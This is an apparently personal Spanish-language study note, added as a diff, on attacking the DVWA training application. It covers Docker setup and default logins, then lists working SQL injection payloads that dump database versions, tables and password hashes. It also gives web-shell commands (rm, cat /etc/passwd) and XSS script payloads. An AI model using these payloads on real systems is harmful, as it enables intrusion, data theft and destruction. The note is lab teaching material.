@@ -1,0 +1,59 @@
+
+ --- HACKING WEB
+
+ --- DVWA ----------------
+# DAMN VULNERABLE WEB APPLICATION
+
+para arrancar DVWA
+abrir una consola / terminal de comandos.
+copiar y pegar:
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+para visualizar DVWA
+arrancar un navegador y teclear
+localhost:80
+
+para accder, en la pantalla de login 
+user: admin
+password: password
+
+en la opción de menu 'Setup Database' hacer click en el botón 'Create/Reset Database'
+volver a hacer login
+en la opción de menu 'DVWA Security' ajustar el Security level a tu gusto. (Low si estás empezando)
+
+y listo
+Ejemplos de ataque
+
+- SQL inyection
+Query: "SELECT first_name, last_name FROM users WHERE user_id = '$id'"
+uso normal: 1
+"SELECT first_name, last_name FROM users WHERE user_id = 1"
+xploits
+1' OR 1=1--' <-- lista todos los usuarios de la BD
+"SELECT first_name, last_name FROM users WHERE user_id = 1' OR 1=1--'"
+más ejemplos
+' union all select 1,@@VERSION-- '  <-- muestra la versión de la base de datos
+' union all select 1,database()'    <-- muestra el nombre de la base de datos
+%' and 1=0 union select null, table_name from information_schema.tables # <-- muestra las tablas de lA BD
+%' or 0=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users # <-- obtiene los hash de las  password
+
+
+- FILE UPLOAD
+uso normal: subir foto
+uso incorrecto: subir text
+uso peligroso: subir una shell.php
+?cmd=ls
+?cmd=rm >nombre_de_fichero>
+?cmd=cat /etc/passwd
+
+
+- XSS reflecting
+<script>alert("Pagina vulnerable en nivel low")</script>
+<img src="https://XXX" alt="YYY" />
+
+- XSS persistente
+probamos que es explotable
+<script> alert("Vulneravilidad low")</script>
+<script>window.open("https://google.es")</script>
+
+
